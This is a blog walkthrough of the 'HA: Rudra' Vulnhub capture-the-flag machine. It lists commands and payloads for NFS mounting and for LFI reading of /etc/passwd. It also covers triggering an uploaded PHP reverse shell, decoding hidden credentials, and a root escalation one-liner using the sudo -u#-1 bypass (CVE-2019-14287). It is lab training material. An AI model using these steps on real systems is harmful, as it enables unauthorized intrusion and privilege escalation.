---
title: 'HA Rudra: Vulnhub Walkthrough'
date: 2019-11-01T10:33:00+01:00
draft: false
---

This is our Walkthrough for HA: Rudra” and this CTF is designed by Hacking Articles Team ![😊](https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f60a.png). Lord Rudra also known as Shiv, Bolenath, Mahadev and he is Venerable by Hinduism. We have designed this VM because it is festival eve in India and all Indian strongly believe in Indian culture and religions and also to spread awareness of Indian culture among all people, hope you will enjoy.

There are multiple methods to solve this machine or direct way to finish the task.

You can download from **[here](https://www.vulnhub.com/entry/ha-rudra,386/)**.

**Level**: Intermediate

**Task**: Boot to Root

### **Penetration Methodologies**

**Initial Recon**

*   netdiscover
*   Nmap
*   Shared directory
*   dirb

**Initial Compromise**

*   LFI

**Established Foothold**

*   Netcat session

**Internal Recon**

*   Access Mysql database

**Data Exfiltration**

*   Steganography

**Lateral Movement**

*   Connect to ssh

**Privilege Escalation**

*   Sudo rights

### **Walkthrough**

### **Initial Recon**

First of all, we try to identify our target. We did this using the netdiscover command. It came out to be

```
192.168.1.101
```

![](https://i2.wp.com/1.bp.blogspot.com/-IbBsWvKqO8Q/Xbvilrp6JRI/AAAAAAAAhN0/I3iRN3_OV1gzyxfdIbsTuVAoO5lClY5BgCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

Now that we have identified our target using the above command, we can continue to our second step that is scanning the target. We will use Nmap to scan the target with the following command:

```
nmap -A 192.168.1.101
```

We found port 22, 80 and 2049 are open for ssh, HTTP and NFS respectively, let’s go for services enumeration.

![](https://i0.wp.com/1.bp.blogspot.com/--faxDcNZ6Es/XbvioJ2nPhI/AAAAAAAAhOQ/Kiqnhei6NWQy0zZupZNwEchR9oqgR7bSgCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

When you will explore machine IP in the web browser, it will display the beautiful sight of lord shiva.

![](https://i1.wp.com/1.bp.blogspot.com/-QH39sHL5Vjc/XbviojvSz3I/AAAAAAAAhOY/JV4pfkFtSMUD4G1099X_OgS3HkpYSelJQCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

If you didn’t find any hint from web page, then without wasting time enumerate the share directory since NFS service is running on the host machine.

```
showmount -e 192.168.1.101  
cd /tmp  
mkdir ignite  
mount -t nfs 192.168.1.101:/home/shivay /tmp/ignite  
cd ignite  
ls
```

![](https://i2.wp.com/1.bp.blogspot.com/-xV6mEoUwXrU/XbvipGgq0aI/AAAAAAAAhOc/spfmyEuIZNodasr25tBVX3jO72e1vFT6gCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

when you will mount the whole shared directory in your local machine, you’ll a text file named “mahadev.txt”.

![](https://i1.wp.com/1.bp.blogspot.com/-nC5Y0jf1FTM/XbvipptugrI/AAAAAAAAhOk/7Y8PmVP3pAsijpkvs_yCc38q6zxXyKROgCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

Till now we didn’t find any hint to establish our foothold, therefore we chose DIRB for directory brute force attack and Luckily found URL for robots.txt file.

![](https://i2.wp.com/1.bp.blogspot.com/-RoxAQkwlchE/XbvipW4RdQI/AAAAAAAAhOg/cSd5tJ2zU7gnynmC3Q81bofXXpQkgluXACLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

Now when you will navigate to the following URL, it will give a hint for nandi.php

```
http://192.168.1.101/robots.txt
```

But on exploring /nandi.php, it will give you a blank page and this hint might be indicating the possibility for LFI.

```
http://192.168.1.101/nandi.php
```

![](https://i1.wp.com/1.bp.blogspot.com/-ogMopBlifSY/Xbvip695KmI/AAAAAAAAhOo/4vlhGihy5JUxj6owjwjYdVTCSbcb9YOegCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

### **Initial Compromised**

To ensure that the host machine is vulnerable to LFI, you need to try to extract /etc/passwd file and this will show you some usernames from here: Rudra, Shivay and mahakaal as shown below.

This phase is considered as **initial compromised** stage because with the help of LFI we are able to extract low privilege data.

![](https://i1.wp.com/1.bp.blogspot.com/-GIikTm-e93Q/XbviqQPbwmI/AAAAAAAAhOs/mX1zBvtmcgM7eJGNptxDSel8VOI7PB1ZQCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

### **Established foothold**

To established foothold, you need to spawn shell of the host machine by injecting malicious file. As you know due to NFS we are able to access share directory and also web application is vulnerable to LFI and for exploiting the host machine first upload the PHP backdoor (penetestmonkey PHP reverse shell) inside the mount directory “/tmp/ignite” and then execute it through a web browser.

![](https://i2.wp.com/1.bp.blogspot.com/-GrtMS58HUq4/XbviqjOWbNI/AAAAAAAAhOw/pcOkC8Vk-iYkVduGNbjV-_g6KtDUMImdgCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

As you can observe in the above image, we have uploaded the PHP backdoor inside /tmp/ignite and now will use LFI to trigger the shell.php file. Keep the Netcat listener ON for reverse connection.

```
http://192.168.1.101/nandi.php?file=/home/shivay/shell.php
```

### ![](https://i0.wp.com/1.bp.blogspot.com/-heu8b9B1708/XbvilbDtJiI/AAAAAAAAhNw/eIdG4WNpt-MPtAp3fT80fuK7blMTeBRWACLcBGAsYHQ/s1600/10.png?w=687&ssl=1)

### **Internal Recon**

As soon as you will trigger the backdoor, it will give the reverse connection of the host machine.

Once we have compromised the host machine, then go for Internal Recon, as you can observe this time, we have used netstat to identify the network statics and found MySQL is running on localhost.

![](https://i0.wp.com/1.bp.blogspot.com/-sL2czKyrLSc/XbvilLUd1oI/AAAAAAAAhNs/I6kgV-dwaxAVYDvuJOz05u8agRHKoEjJwCLcBGAsYHQ/s1600/11.png?w=687&ssl=1)

Without wasting time, we get into MySQL DBMS and enumerated the following information:

```
Database name: mahadev  
Table name: hint  
Record: check in media filesystem
```

It means there are is something inside media filesystem and the author wants to dig it out.

![](https://i0.wp.com/1.bp.blogspot.com/-cCJ8faCEc00/XbvimZuMxyI/AAAAAAAAhN8/yiI33LUvMNEQLjAtJ6rBLFlJl03QV_-LACLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

### **Data Exfiltration-Steganography**

So, when you will move inside /media directory then you will get two files named “creds and hint” and the “**hint**” file contains the following hints:

**_Link:_ [_https://www.hackingarticles.in/cloakify-factory-a-data-exfiltration-tool-uses-text-based-steganography/_](https://www.hackingarticles.in/cloakify-factory-a-data-exfiltration-tool-uses-text-based-steganography/)**

_Message: Without noise_

The cred file contains emojis and it looks like a kind of steganography, download the cred file in your local machine (I saved as /root/pwd) and without wasting we explored the given link. This link will open the article on data exfiltration tool named cloackify which is used by the author for hiding text behind emojis.

![](https://i0.wp.com/1.bp.blogspot.com/-gvht50M1qQA/XbvimWr0ucI/AAAAAAAAhN4/m7FNvqCtxGEJzYEzuL854Do1KOTTdE0EQCLcBGAsYHQ/s1600/13.png?w=687&ssl=1)

With the help of the above link, you can extract the hidden text behind emojis. Follow the below step in your local machine.

Download the tool from GitHub and run a python script as shown then decrypt the file **without noise** as given inside the hint file.

```
python cloackifyFactory.py  
Press key: 2  
Decloackify path: /root/pwd  
Path for saved decloacked data: /root/decodedpwd  
Add noise: No
```

![](https://i1.wp.com/1.bp.blogspot.com/-vc1wUnYVaMA/Xbvimp_pjhI/AAAAAAAAhOA/A_ncFZeHJnQ8P_JZsv4GsWxBx2x6VEP9wCLcBGAsYHQ/s1600/14.png?w=687&ssl=1)

Choose emoji as a type of ciphers and press key 3. This will save the decoded text inside /root/decodedpwd as shown below.

![](https://i1.wp.com/1.bp.blogspot.com/-z5LueYZYjgw/XbvinB5rOAI/AAAAAAAAhOE/khCs9gQaKkQe1KJUbzNaJZuOKJyMnH5EwCLcBGAsYHQ/s1600/15.png?w=687&ssl=1)

And we found the credential for the following:

```
Username: mahakaal  
Password: kalbhairav
```

![](https://i0.wp.com/1.bp.blogspot.com/-gJXjLRL-pS8/Xbving4St8I/AAAAAAAAhOI/nVM5YzTiPOcOJjzQ2Fa5VsQefUQmh2WuQCLcBGAsYHQ/s1600/16.png?w=687&ssl=1)

### **Lateral Movement**

So with the help above credential, we connect to ssh service and start post enumeration. Thus, we check sudo right for mahakaal and found that he has sudo right to run /usr/bin/watch program other than root which means with ALL specified, user mahakaal can run the binary / usr/bin/watch as any user.

![](https://i1.wp.com/1.bp.blogspot.com/-1NLHnHPuDzI/XbvinhPtRAI/AAAAAAAAhOM/hwX3HgLjrOQKBQywvypJgCmFj9qFcXbgACLcBGAsYHQ/s1600/17.png?w=687&ssl=1)

### **Privilege Escalation**

The author added this loophole because it is the latest zero-day exploit CVE: 2019-14287 and you should to proactive to bypass it.

Type following for escalating the root the shell:

```
sudo -u#-1 watch -x sh -c 'reset; exec sh 1>&0 2>&0' -u  
cd root  
cat final.txt
```

**Conclusion:** The VM was designed to cover each track of the kill chain by considering red team approach and proactive learning with latest vulnerabilities.

Hope you have enjoyed this machine. Happy Hacking!!!!!!!

![](https://i1.wp.com/1.bp.blogspot.com/-vl5IczmPAjU/XbvioTnIcXI/AAAAAAAAhOU/KhxoF30OfOUWWYYp6np40DxdkbvhDvnigCLcBGAsYHQ/s1600/18.png?w=687&ssl=1)

**Author**: Komal Singh is a Cyber Security Researcher and Technical Content Writer, she is completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contact [**Here**](https://www.linkedin.com/in/komal-rajput-26b783131/)

The post [HA Rudra: Vulnhub Walkthrough](https://www.hackingarticles.in/ha-rudra-vulnhub-walkthrough/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/34hSSVh